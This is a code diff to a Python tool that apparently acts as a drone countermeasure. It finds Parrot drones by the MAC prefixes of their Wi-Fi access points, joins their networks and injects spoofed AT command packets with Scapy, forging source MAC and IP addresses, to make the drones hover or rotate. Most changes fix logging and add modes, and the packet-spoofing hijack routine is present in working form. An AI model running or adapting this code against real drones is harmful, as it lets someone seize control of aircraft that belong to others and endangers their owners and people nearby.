@@ -32,7 +32,7 @@ def startArduino():
 		serialDev = "/dev/ttyACM" + str(i)
 		i += 1
 	if not os.path.exists(serialDev):
-		logging.ERROR("ERROR - could not find Arduino connected. Going to 'Moderate' mode")
+		logging.error("ERROR - could not find Arduino connected. Going to 'Moderate' mode")
 		ser = None
 	else:
 		ser = serial.Serial(serialDev, 9600)
@@ -49,10 +49,12 @@ def readKnobState():
 	ser.flushInput() #flush serial to get the newest data
 	sleep(2) #wait for the data
 	modeStr = ""
-	while (not modeStr.isdigit()) or (int(modeStr) > 3):
+	while (not modeStr.isdigit()) or int(modeStr) > 3:
 		modeStr=ser.readline().rstrip()
 		sleep(0.1)
 	mode = int(modeStr)
+	if mode == 0:
+		return "Off"
 	if mode == 1:
 		return "Aggressive"
 	if mode == 2:
@@ -66,8 +68,8 @@ def scanForParrots(interface, whitelist, underattack):
 	for ap in aps:
 		if ap.address.startswith('90:03:B7') or ap.address.startswith('00:26:7E') or ap.address.startswith('A0:14:3D') or ap.address.startswith('00:12:1C') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
 			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
-				logging.INFO("New parrot wifi found:", ap.ssid)
-				arduinoLCD("New drone: " + ap.ssid)
+				logging.info("New parrot wifi found: %s", ap.ssid)
+				arduinoLCD("New:" + ap.ssid)
 				parrots.append(ap)
 	return parrots
 
@@ -78,7 +80,7 @@ def connectTo(ap, interface):
 		scheme.save()
 		scheme.activate() #connect to the Parrot's wifi
 	except Exception as detail:
-		logging.ERROR("Error while trying to connect to wifi in function connectTo - ", detail)
+		logging.error("Error while trying to connect to wifi in function connectTo - %s", detail)
 		return False
 	#reset global variables for sniffing
 	global srcMAC, dstMAC, srcIP, dstIP, seqNr
@@ -89,11 +91,19 @@ def connectTo(ap, interface):
 	seqNr = ""
 	return True
 
+def connectToByMAC(mac, interface):
+	aps = Cell.all(interface)
+	for apA in aps:
+		if(apA.address == mac):
+			return connectTo(apA, interface)
+        return False
+
+
 def getWifiDistance(interface, ap):
 	aps = Cell.all(interface)
 	for apA in aps:
 		if(apA.address == ap.address):
-			return -1 * apA.signal #originally a negative number, closer to 0 - closer the AP
+			return -1* apA.signal #originally a negative number, closer to 0 - closer the AP
 	return 0 #if no longer here, exit
 
 def disconnectFromWifi(interface):
@@ -144,7 +154,7 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 		part2 = "0,0,0,0,0,0,0"
 	elif command == "warn": #slowly rotate
 		part1 = "PCMD_MAG"
-		part2 = "0,0,0,0,-50000000,0,0"
+		part2 = "0,0,0,0,-50000000,0,0" #"1,0,0,0,1" #last value is the angular speed [-1,1] -1082130432
 	elif command == "release":
 		part1 = "PCMD_MAG"
 		part2 = "0,0,0,0,0,0,0"
@@ -153,7 +163,8 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 
 	for i in range(1, count+1):
 		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
-		#logging.debug(payload)
+		logging.debug("Sending the following payload: %s",payload)
 		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
 		sendp(spoofed_packet, iface=interface)
 		sleep(0.3)
+
